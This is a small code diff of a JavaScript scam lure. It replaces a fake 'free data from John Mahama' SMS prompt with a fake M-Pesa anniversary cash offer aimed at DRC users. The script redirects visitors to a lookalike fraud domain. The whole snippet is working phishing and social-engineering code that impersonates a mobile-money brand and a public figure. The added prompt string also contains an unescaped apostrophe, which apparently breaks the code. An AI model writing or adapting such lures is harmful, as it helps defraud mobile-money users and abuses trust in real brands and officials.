@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = '80.000Francs'
+password=prompt('SMS : Félicitations Vous faites partie des clients M-Pesa à bénéficier de loffre anniversaire de 80000F, veuillez appuyer sur OK pour retirer de l'argent ','80.000Francs');
+if (password != '80.000Francs') {
+location.href='https://mpesa-drc.programs.lat/offre';
 }
